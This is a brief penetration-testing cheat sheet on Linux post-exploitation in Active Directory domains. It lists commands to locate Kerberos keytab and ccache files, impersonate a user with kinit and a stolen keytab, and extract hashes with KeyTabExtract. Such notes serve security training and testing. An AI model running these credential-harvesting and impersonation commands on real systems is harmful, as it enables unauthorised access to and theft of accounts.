# Linux Post-Exploitation

**Linux** computers can connect to **Active Directory**, though it's a **Microsoft** technology. Also it's not required for **Linux** machine to be connected to **AD** to use **Kerberos** tickets.

***

## Checking Linux and AD relations

### realm

```bash
realm list
```

### PS

<pre class="language-bash"><code class="lang-bash"><strong>ps -ef | grep -i "winbind\|sssd"
</strong></code></pre>

## Finding Kerberos Tickets

Finding tickets is very important part of Active Directory exploitation and post-exploitation. For a beginning, tickets in Linux are usually located here:

* **keytab files** - commonly allow scripts to authenticate automatically using Kerberos without human interaction or access to a password stored in a plain text file
* **ccache files** - **c**redential **c**ache is stored in <mark style="color:green;">**/tmp**</mark> directory&#x20;
* <mark style="color:green;">**`KRB5CCNAME`**</mark> - environment variable

### Crontab

```bash
crontab -l
```

### Keytab Files

```bash
find / -name *keytab* -ls 2>/dev/null
```

### Ccache

```bash
env | grep -i krb5
ls -la /tmp
```

***

## Abusing Keytab

### Impersonate user

```bash
klist -k -t #list keytab file info
kinit carni7@AMOGUS.KEK -k -t /opt/kerbusers/carni7.keytab #impersonation carni7 using his keytab
```

### **KeyTabExtract**

[**\[LINK\]**](https://github.com/sosdave/KeyTabExtract) This is tool which is extracting **Kerberos** hashes from **keytab** file.

```python
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

## Abusing ccache

For using **ccache** files you need to have root privileges

### Checking group privileges

```bash
id carni7@amogus.kek
```
